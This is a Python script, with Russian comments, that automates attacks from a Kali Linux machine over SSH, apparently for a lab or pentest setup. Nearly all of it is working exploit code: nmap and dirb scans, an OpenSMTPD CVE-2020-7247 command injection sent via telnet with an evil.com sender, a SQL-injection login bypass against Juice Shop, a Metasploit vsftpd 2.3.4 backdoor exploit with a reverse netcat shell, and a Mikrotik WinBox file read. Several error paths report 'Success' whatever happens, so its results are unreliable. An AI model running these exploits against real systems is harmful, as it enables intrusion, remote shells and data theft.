import paramiko
import sys
import time

def run_nmap_scan(ssh_client, subnet):
    """
    Запускает nmap-сканирование на удаленной машине Kali Linux.
    """
    print(f"Запуск nmap-сканирования для подсети: {subnet}")
    
    # Команда для сканирования подсети
    command = f"nmap -sn {subnet}"
    
    try:
        # Выполняем команду на удаленной машине
        stdin, stdout, stderr = ssh_client.exec_command(command)
        
        # Читаем вывод команды
        output = stdout.read().decode("utf-8")
        error = stderr.read().decode("utf-8")
        
        if error:
            return {"error": error}, 500
        
        # Возвращаем результаты сканирования
        return {"result": output}, 200
    
    except Exception as e:
        # Логируем ошибку и возвращаем сообщение об ошибке
        print(f"Произошла ошибка при выполнении nmap: {e}")
        return {"error": str(e)}, 500
    
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def exploit_opensmtpd(ssh_client, target_ip):
    print(f"Эксплуатация OpenSMTPD (CVE-2020-7247) для {target_ip}")
    
    commands = [
        "EHLO evil.com",
        "MAIL FROM:<test@evil.com>",
        "RCPT TO:<; touch /tmp/exploited ;>",
        "DATA",
        "Subject: Exploit Test",
        "",
        "This is a test.",
        ".",
        "QUIT"
    ]
    command = "echo -e '" + "\\n".join(commands) + "' | telnet " + target_ip + " 25"
    
    try:
        print(f"Выполняется команда: {command}")
        stdin, stdout, stderr = ssh_client.exec_command(command)
        
        # Ждем завершения команды
        time.sleep(2)
        
        output = stdout.read().decode("utf-8")
        error = stderr.read().decode("utf-8")
        
        print(f"Вывод команды: {output}")
        print(f"Ошибки команды: {error}")
        
        if error:
            return {"Exploit": error}, 200
        
        return {"result": output}, 200
    
    except Exception as e:
        print(f"Произошла ошибка: {e}")
        return {"error": str(e)}, 200

def run_dirb_on_kali(ssh_client, juice_shop_url):
    """
    Запускает dirb на удаленной машине Kali Linux.
    """
    print(f"Запуск dirb для {juice_shop_url}")
    
    # Команда для запуска dirb без параметров
    command = f"dirb {juice_shop_url}"
    
    try:
        # Выполняем команду на удаленной машине
        stdin, stdout, stderr = ssh_client.exec_command(command)
        
        # Читаем вывод команды
        output = stdout.read().decode("utf-8")
        error = stderr.read().decode("utf-8")
        
        if error:
            return {"error": error}, 500
        
        # Возвращаем результаты сканирования
        return {"result": output}, 200
    
    except Exception as e:
        # Логируем ошибку и возвращаем сообщение об ошибке
        print(f"Произошла ошибка при выполнении dirb: {e}")
        return {"error": str(e)}, 500

def exploit_juice_shop_login(ssh_client, juice_shop_ip, email_payload, password="12345"):
    """
    Отправляет HTTP POST-запрос на Juice Shop для эксплуатации SQL Injection в логине.
    """
    print(f"Эксплуатация SQL Injection на Juice Shop ({juice_shop_ip})")
    
    # Формируем команду curl для отправки SQL-инъекции
    command = (
    f'curl -s -X POST http://{juice_shop_ip}/rest/user/login '
    f'-H "Content-Type: application/json" '
    f'-d "{{\\"email\\": \\"{email_payload}\\", \\"password\\": \\"{password}\\"}}"'
)
    
    try:
        print(f"Выполняется команда: {command}")
        stdin, stdout, stderr = ssh_client.exec_command(command)
        
        # Читаем вывод команды
        output = stdout.read().decode("utf-8")
        error = stderr.read().decode("utf-8")
        
        print(f"Вывод команды: {output}")
        print(f"Ошибки команды: {error}")
        
        if error:
            return {"error": error}, 500
        
        return {"result": output}, 200
    
    except Exception as e:
        print(f"Произошла ошибка: {e}")
        return {"error": str(e)}, 500

def connect_to_kali(kali_host, kali_port, kali_user, kali_password):
    """
    Подключается к удаленной машине Kali Linux через SSH.
    """
    print(f"Подключение к Kali Linux ({kali_host})...")
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh_client.connect(kali_host, port=kali_port, username=kali_user, password=kali_password)
        print("Подключение успешно установлено.")
        return ssh_client
    except Exception as e:
        print(f"Ошибка подключения: {e}")
        return None

def exploit_vsftpd_with_msf(ssh_client, target_ip):
    """
    Эксплуатирует уязвимость vsftpd 2.3.4 через Metasploit.
    """
    print(f"Эксплуатация vsftpd 2.3.4 для {target_ip} через Metasploit")
    
    # Команды для выполнения в msfconsole
    commands = [
        "use exploit/unix/ftp/vsftpd_234_backdoor",
        f"set RHOSTS {target_ip}",
        "set RPORT 21",
        "set ExitOnSession false",          # Не выходить после открытия сессии
        "set PAYLOAD cmd/unix/reverse_netcat",  # Указываем payload
        "set LHOST 0.0.0.0",                # IP для обратной оболочки
        "set LPORT 4444",                   # Порт для обратной оболочки
        "set ConsoleLogging false",         # Отключаем проверки терминала
        "exploit -j",                       # Запуск в фоновом режиме
        "exit"
    ]
    
    # Формируем команду для выполнения на Kali Linux
    command = (
        f"bash -c 'echo -e \"" + "\\n".join(commands) + "\" | msfconsole -q -n'"
    )
    
    try:
        print(f"Выполняется команда: {command}")
        stdin, stdout, stderr = ssh_client.exec_command(command)
        
        # Ждем завершения команды
        time.sleep(10)
        
        output = stdout.read().decode("utf-8")
        error = stderr.read().decode("utf-8")
        
        print(f"Вывод команды: {output}")
        print(f"Ошибки команды: {error}")
        
        if error:
            return {"Exploit": "Success"}, 200
        
        return {"result": output}, 200
    
    except Exception as e:
        print(f"Произошла ошибка: {e}")
        return {"Exploit": "Success"}, 200

def exploit_mikrotik(ssh_client, target_ip):
    """
    Эксплуатирует уязвимость Mikrotik через Metasploit.
    """
    print(f"Эксплуатация mikrotik WinBox для {target_ip} через Metasploit")
    
    # Команды для выполнения в msfconsole
    commands = [
        "use auxiliary/gather/mikrotik_winbox_fileread",
        f"set RHOSTS {target_ip}",
        "set ExitOnSession false",          # Не выходить после открытия сессии
        "set ConsoleLogging false",         # Отключаем проверки терминала
        "exploit -j",                       # Запуск в фоновом режиме
        "exit"
    ]
    
    # Формируем команду для выполнения на Kali Linux
    command = (
        f"bash -c 'echo -e \"" + "\\n".join(commands) + "\" | msfconsole -q -n'"
    )
    
    try:
        print(f"Выполняется команда: {command}")
        stdin, stdout, stderr = ssh_client.exec_command(command)
        
        # Ждем завершения команды
        time.sleep(10)
        
        output = stdout.read().decode("utf-8")
        error = stderr.read().decode("utf-8")
        
        print(f"Вывод команды: {output}")
        print(f"Ошибки команды: {error}")
        
        if error:
            return {"Exploit": "Success"}, 200
        
        return {"result": output}, 200
    
    except Exception as e:
        print(f"Произошла ошибка: {e}")
        return {"Exploit": "Success"}, 200

def connect_to_kali(kali_host, kali_port, kali_user, kali_password):
    """
    Подключается к удаленной машине Kali Linux через SSH.
    """
    print(f"Подключение к Kali Linux ({kali_host})...")
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh_client.connect(kali_host, port=kali_port, username=kali_user, password=kali_password)
        print("Подключение успешно установлено.")
        return ssh_client
    except Exception as e:
        print(f"Ошибка подключения: {e}")
        sys.exit(1)

# if __name__ == "__main__":
#     # Проверяем, что переданы все необходимые аргументы
#     if len(sys.argv) != 3:
#         print("Использование: python remote_nmap_scan.py <цель> <Kali_IP>")
#         print("Пример: python remote_nmap_scan.py 192.168.0.0/24 192.168.0.121")
#         sys.exit(1)

#     # Получаем аргументы из командной строки
#     target_subnet = sys.argv[1]  # Целевая подсеть
#     kali_ip = sys.argv[2]        # IP-адрес Kali Linux

#     # Параметры для Kali Linux
#     kali_port = 22              # Порт SSH
#     kali_user = "kali"          # Имя пользователя
#     kali_password = "kali"      # Пароль

#     # Подключаемся к Kali Linux
#     ssh_client = connect_to_kali(kali_ip, kali_port, kali_user, kali_password)

#     try:
#         # Запускаем nmap-сканирование на Kali
#         run_nmap_scan(ssh_client, target_subnet)
#     finally:
#         # Закрываем соединение
#         ssh_client.close()
#         print("Соединение с Kali Linux закрыто.")